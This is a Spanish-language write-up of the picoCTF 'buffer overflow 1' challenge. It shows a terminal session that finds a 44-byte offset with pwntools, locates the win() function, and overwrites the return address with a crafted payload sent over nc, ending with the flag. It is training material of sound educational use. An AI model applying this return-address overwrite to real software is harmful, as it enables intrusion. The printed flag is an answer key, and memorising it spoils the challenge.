# buffer overflow 1

## Descripcion
Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/187/vuln). You can view source [here](https://artifacts.picoctf.net/c/187/vuln.c). And connect with it using `nc saturn.picoctf.net 62008`

## Pistas
- 

## Solución

```
eltetor14-picoctf@webshell:~$ wget https://artifacts.picoctf.net/c/187/vuln
--2023-05-27 21:54:01--  https://artifacts.picoctf.net/c/187/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 108.156.172.74, 108.156.172.42, 108.156.172.120, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|108.156.172.74|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15704 (15K) [application/octet-stream]
Saving to: 'vuln'

vuln                                            100%[======================================================================================================>]  15.34K  --.-KB/s    in 0.006s  

2023-05-27 21:54:01 (2.32 MB/s) - 'vuln' saved [15704/15704]

eltetor14-picoctf@webshell:~$ chmod +x vuln
eltetor14-picoctf@webshell:~$ echo 'aaaaaaaaaaaaaaaa' | ./vuln                                                                
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
eltetor14-picoctf@webshell:~$ python          
Python 3.8.13 (default, Mar 28 2022, 11:38:47) 
[GCC 7.5.0] :: Anaconda, Inc. on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> exit()

eltetor14-picoctf@webshell:~$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'| ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln

eltetor14-picoctf@webshell:~$ python
Python 3.8.13 (default, Mar 28 2022, 11:38:47) 
[GCC 7.5.0] :: Anaconda, Inc. on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic_find(0x6161616c)
44
>>> 'E'*44
'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'
>>> exit()

eltetor14-picoctf@webshell:~$ objdump -D vuln -M intel | grep 'win' 
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>

eltetor14-picoctf@webshell:~$ python
Python 3.8.13 (default, Mar 28 2022, 11:38:47) 
[GCC 7.5.0] :: Anaconda, Inc. on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
exit()

eltetor14-picoctf@webshell:~$ echo 'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.

eltetor14-picoctf@webshell:~$ touch flag.txt                                                                                                        

eltetor14-picoctf@webshell:~$ echo 'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
d@*���=���d�<����EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE�EEEEEEEEEEEEzsh: done                echo 'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln

eltetor14-picoctf@webshell:~$ echo 'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\xf6\x91\x04\x08' | nc saturn.picoctf.net 52369
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_0195a40f}
```

## Bandera
picoCTF{addr3ss3s_ar3_3asy_0195a40f}

## Notas adicionales

## Referencias